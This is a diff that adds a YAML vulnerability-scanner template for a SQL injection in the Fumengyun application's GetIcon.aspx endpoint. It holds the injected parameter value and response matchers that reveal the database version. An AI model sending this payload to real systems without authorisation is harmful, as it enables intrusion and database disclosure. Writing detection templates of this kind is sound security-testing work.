@@ -1,0 +1,25 @@
+http:
+    - matchers:
+        - part: body
+          type: word
+          words:
+            - Microsoft SQL Server
+            - PostgreSQL
+            - MySQL
+        - status:
+            - 200
+          type: status
+      matchers-condition: and
+      method: GET
+      path:
+        - '{{BaseURL}}/Common/GetIcon.aspx?FUID=-1''and+1=@@VERSION--'
+id: fumengyun-sql-injection
+info:
+    author: ProjectDiscoveryAI
+    description: |
+        Potential SQL Injection in Fumengyun application via the GetIcon.aspx endpoint. Exploitation can reveal database version information.
+    name: Fumengyun SQL Injection
+    severity: high
+    tags:
+        - sql-injection
+        - PostgreSQL
